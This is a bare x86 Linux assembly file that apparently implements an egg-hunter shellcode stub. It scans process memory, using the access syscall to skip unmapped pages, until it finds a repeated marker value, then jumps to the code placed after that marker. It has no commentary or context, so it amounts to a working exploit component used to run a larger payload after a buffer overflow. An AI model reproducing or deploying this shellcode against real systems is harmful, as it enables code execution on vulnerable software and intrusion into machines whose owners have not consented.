global _start
section .text
_start:
mov ebx, 0x50905090
xor ecx, ecx
mul ecx
_jmp1:
or dx,0xfff
_jmp2:
inc edx
pusha
lea ebx, [edx+0x4]
mov al, 0x21
int 0x80
cmp al, 0xf2
popa
jz _jmp1
cmp [edx],ebx
jnz _jmp2 
cmp [edx+0x4],ebx
jnz _jmp2
jmp edx
